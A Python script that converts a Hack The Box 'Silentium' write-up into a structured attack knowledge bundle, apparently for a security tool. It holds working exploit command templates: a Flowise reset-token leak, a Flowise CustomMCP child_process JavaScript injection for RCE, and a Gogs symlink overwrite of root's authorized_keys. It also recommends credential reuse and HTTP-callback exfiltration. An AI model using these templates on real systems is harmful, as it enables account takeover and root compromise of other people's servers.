"""Build and validate the completed Silentium SemanticDraftBundle."""
import sys, pathlib
sys.path.insert(0, '/home/titagram/sedna/src')
sys.path.insert(0, '/home/titagram/sedna/tests/knowledge')
from test_semantic_llm import _prepared_from_markdown
from sedna.knowledge.semantic.drafts import SemanticDraftBundle
from sedna.knowledge.semantic.materialize import validate_segment_accounting

md=open('/home/titagram/htb-writeups/write-ups/machines/Silentium/Silentium.md').read()
prepared=_prepared_from_markdown(md,title='Machine: Silentium')
print('segments:',len(prepared.segments))

def step(local_id, ordinal, access_before, access_after, environment, privileges_before,
         privileges_after, observations, hypothesis, action, evidence, citation):
    return {
      'artifact_type':'case_step','local_id':local_id,'ordinal':ordinal,
      'state_before':{'access':access_before,'environment':environment,'privileges':privileges_before},
      'observations':observations,
      'hypotheses':[{'statement':hypothesis,'origin':'explicit'}],
      'selected_action':{'intent':action},
      'evidence':[{'summary':evidence,'origin':'explicit','category':'exploitation'}],
      'state_after':{'access':access_after,'environment':environment,'privileges':privileges_after},
      'origin':'explicit','citations':[{'segment_indexes':[citation]}]
    }

steps=[
 step('step-1',1,'unauthenticated network access','Flowise admin and Gogs user accounts',['Linux','nginx','silentium.htb','staging.silentium.htb','staging-v2-code.dev.silentium.htb'],[],[],['Only 22/tcp SSH and 80/tcp nginx open','vhost enumeration finds staging.silentium.htb = Flowise 3.0.5 and staging-v2-code.dev.silentium.htb = Gogs','Flowise user enum via /auth/login distinguishes valid emails (ben@silentium.htb)','Gogs has open registration'],'hidden vhosts host Flowise and Gogs that together enable the compromise','enumerate all virtual hosts and identify the Flowise and Gogs services','two attack surfaces found: Flowise (login/reset) and Gogs (registration)',1),
 step('step-2',2,'unauthenticated access to Flowise','Flowise admin account takeover',['Flowise','auth/login','forgot-password','tempToken'],[],[],['forgot-password returns the user object including tempToken','the reset token is disclosed in the API response not by email','reset-password with that token changes the password'],'Flowise leaks its password-reset token letting anyone reset a known-email account','exploit the token disclosure to takeover ben@silentium.htb','admin account owned',3),
 step('step-3',3,'Flowise admin account','root RCE inside the Flowise container',['node-load-method/customMCP','mcpServerConfig','child_process','http','Docker 172.18.0.2'],[],['root-in-container'],['customMCP mcpServerConfig is evaluated as JS in Node via the Function constructor','command output is consumed as MCP config and not returned','Node built-in http can exfiltrate to an external listener'],'authenticated CustomMCP RCE gives arbitrary command execution in the Node container','send a JS payload calling child_process and exfiltrate the result via an HTTP callback','uid=0(root) inside the Flowise container',3),
 step('step-4',4,'root RCE inside the container','SSH shell as ben + user flag',['env','SMTP_PASSWORD','SSH','user.txt'],[],['ben'],['container env leaks an SMTP password','the SMTP password is reused verbatim for host SSH login','/home/ben/user.txt is readable as ben'],'credential reuse from a container env gives host SSH access','dump env and reuse the SMTP password over SSH','user flag obtained as ben',3),
 step('step-5',5,'SSH shell as ben','root RCE on host',['Gogs','CVE-2025-8110','PutContents','symlink','authorized_keys'],[],[],['Gogs 0.13.3 runs as root with open registration','PutContents API validates ../ but does not resolve symlinks before writing','an authenticated user can push a symlink and overwrite the file it points to'],'a Gogs symlink traversal lets any registered user overwrite arbitrary server files as root','plant a symlink to /root/.ssh/authorized_keys and overwrite it with an attacker SSH key','root flag obtained via SSH as root',4),
]

bundle={
 'artifacts':[{
   'draft_type':'case','artifact_type':'case','knowledge_role':'case_study',
   'local_id':'case-silentium','origin':'explicit','title':'Silentium: Flowise ATO+RCE, credential reuse to SSH, and Gogs symlink privesc to root',
   'starting_access':'unauthenticated HTTP access to a financial SPA with hidden Flowise and Gogs vhosts',
   'source_quality':'complete','difficulty':'medium',
   'outcome':'user and root proofs obtained; proof values redacted',
   'transferable_properties':[
     'Flowise forgot-password discloses the tempToken in the API response, enabling unauthenticated account takeover for any known-email account',
     'Flowise CustomMCP mcpServerConfig is evaluated as JavaScript in Node; when output is not returned, exfiltrate it via an HTTP callback to an external listener',
     'dump container env on a foothold and try leaked credentials (e.g. SMTP password) verbatim against host SSH',
     'a Gogs instance running as root with open registration is exploitable for root RCE by pushing a symlink to /root/.ssh/authorized_keys and overwriting it via the PutContents API'
   ],
   'non_transferable_properties':['Flowise account email, SMTP password value, container IPs, and Gogs vhost path are target-specific'],
   'steps':steps,'citations':[{'segment_indexes':[1,2,3,4,6]}]
 }],
 'execution_examples':[
   {
    'local_id':'ex-flowise-ato','parent_local_id':'step-2',
    'command_template':"curl -X POST http://{{target}}/api/v1/account/forgot-password -H 'Host: {{flowise_vhost}}' -H 'Content-Type: application/json' -d '{\\\"user\\\":{\\\"email\\\":\\\"{{email}}\\\"}}'",
    'placeholders':[
      {'name':'target','kind':'target','binding_policy':'authorized_scope','role':'authorized host'},
      {'name':'flowise_vhost','kind':'target','binding_policy':'authorized_scope','role':'Flowise vhost'},
      {'name':'email','kind':'value','binding_policy':'host_supplied','role':'known valid account email'}],
    'capability_hint':'disclose the Flowise account password-reset token','purpose':'obtain unauth account takeover',
    'observed_role':'unauthenticated remote user',
    'prerequisites':[{'statement':'Flowise forgot-password leaks the tempToken in the API response for a valid email','citations':[{'segment_indexes':[3]}]}],
    'platform_constraints':[{'dimension':'execution_environment','relation':'required','value':'Flowise password reset API','citations':[{'segment_indexes':[3]}]}],
    'citations':[{'segment_indexes':[3]}]
   },
   {
    'local_id':'ex-flowise-rce','parent_local_id':'step-3',
    'command_template':"curl -X POST http://{{target}}/api/v1/node-load-method/customMCP -H 'Host: {{flowise_vhost}}' -H 'Cookie: {{session_cookie}}' -H 'x-request-from: internal' -d '{\\\"loadMethod\\\":\\\"listActions\\\",\\\"inputs\\\":{\\\"mcpServerConfig\\\":\\\"({x:(function(){const cp=process.mainModule.require(\\\\\\\"child_process\\\\\\\");const out=cp.execSync(\\\\\\\"{{command}}\\\\\\\").toString();return out;})()})\\\"}}'",
    'placeholders':[
      {'name':'target','kind':'target','binding_policy':'authorized_scope','role':'authorized host'},
      {'name':'flowise_vhost','kind':'target','binding_policy':'authorized_scope','role':'Flowise vhost'},
      {'name':'session_cookie','kind':'value','binding_policy':'host_supplied','role':'authenticated Flowise session cookie'},
      {'name':'command','kind':'value','binding_policy':'host_supplied','role':'command to run in the Node container'}],
    'capability_hint':'execute arbitrary Node.js code via Flowise CustomMCP','purpose':'obtain RCE as the container user',
    'observed_role':'authenticated Flowise user',
    'prerequisites':[{'statement':'the account is authenticated and customMCP evaluates mcpServerConfig as JS','citations':[{'segment_indexes':[3]}]}],
    'platform_constraints':[{'dimension':'execution_environment','relation':'required','value':'Flowise CustomMCP node','citations':[{'segment_indexes':[3]}]}],
    'citations':[{'segment_indexes':[3]}]
   },
   {
    'local_id':'ex-gogs-symlink','parent_local_id':'step-5',
    'command_template':"git -c http.extraHeader='Host: {{gogs_vhost}}' push; curl -X PUT http://{{target}}/api/v1/repos/{{gogs_user}}/{{repo}}/contents/{{symlink}} -H 'Host: {{gogs_vhost}}' -H 'Authorization: token {{api_token}}' -H 'Content-Type: application/json' -d '{\\\"content\\\":\\\"{{b64_content}}\\\",\\\"message\\\":\\\"update\\\"}'",
    'placeholders':[
      {'name':'target','kind':'target','binding_policy':'authorized_scope','role':'authorized host'},
      {'name':'gogs_vhost','kind':'target','binding_policy':'authorized_scope','role':'Gogs vhost'},
      {'name':'gogs_user','kind':'value','binding_policy':'host_supplied','role':'registered Gogs username'},
      {'name':'repo','kind':'value','binding_policy':'host_supplied','role':'attacker-owned repo name'},
      {'name':'symlink','kind':'value','binding_policy':'host_supplied','role':'committed symlink path'},
      {'name':'api_token','kind':'value','binding_policy':'host_supplied','role':'Gogs API token'},
      {'name':'b64_content','kind':'value','binding_policy':'host_supplied','role':'base64 of attacker SSH public key'}],
    'capability_hint':'overwrite an arbitrary server file through a Gogs symlink','purpose':'plant an attacker SSH key as root',
    'observed_role':'any registered Gogs user',
    'prerequisites':[{'statement':'Gogs runs as root, registration is open, and the PutContents API does not resolve symlinks','citations':[{'segment_indexes':[4]}]}],
    'platform_constraints':[{'dimension':'execution_environment','relation':'required','value':'Gogs PutContents API','citations':[{'segment_indexes':[4]}]}],
    'citations':[{'segment_indexes':[4]}]
   }
 ],
 'ignored_segment_indexes':[0,5]
}

b=SemanticDraftBundle.model_validate(bundle)
print('Pydantic OK. artifacts:',len(b.artifacts),'exec:',len(b.execution_examples))
validate_segment_accounting(prepared,b)
print('Segment accounting OK')
out=pathlib.Path('/tmp/bundles/Silentium.json'); out.parent.mkdir(parents=True,exist_ok=True)
out.write_text(b.model_dump_json(indent=2)); print('wrote',out)
